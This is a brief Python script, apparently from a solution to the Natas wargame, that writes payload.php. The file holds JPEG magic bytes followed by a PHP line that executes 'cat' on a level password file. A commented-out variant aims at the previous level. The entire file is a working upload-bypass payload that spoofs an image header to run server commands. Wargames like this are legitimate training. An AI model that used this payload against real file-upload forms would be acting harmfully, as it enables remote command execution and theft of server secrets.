fh = open('payload.php', 'wb')
# fh.write('\xD8\xD8\xFF\xDB' + '<?php echo exec("cat /etc/natas_webpass/natas13") ?>')
# magic=bytes.fromhex('D8d8ffdb').decode('utf-8')


# magic = "\xd8\xff\xe0\xff"
# magic = b''.fromhex('d8ffe0ff')
magic = b'\xff\xd8\xff\xdb'

# print(magic)
# fh.write(magic)

fh.write(magic + b'<?php echo exec("cat /etc/natas_webpass/natas14") ?>')
fh.close()
